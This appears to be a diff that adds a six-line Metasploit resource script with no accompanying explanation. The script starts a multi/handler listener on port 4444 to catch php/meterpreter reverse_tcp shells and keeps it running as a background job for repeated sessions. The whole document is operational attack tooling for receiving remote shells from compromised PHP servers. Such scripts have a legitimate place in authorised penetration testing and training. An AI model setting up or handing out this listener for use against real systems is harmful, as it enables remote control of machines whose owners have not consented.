@@ -1,0 +1,6 @@
+use exploit/multi/handler
+set payload php/meterpreter/reverse_tcp
+set lhost 0.0.0.0
+set lport 4444
+set exitonsession false
+exploit -j
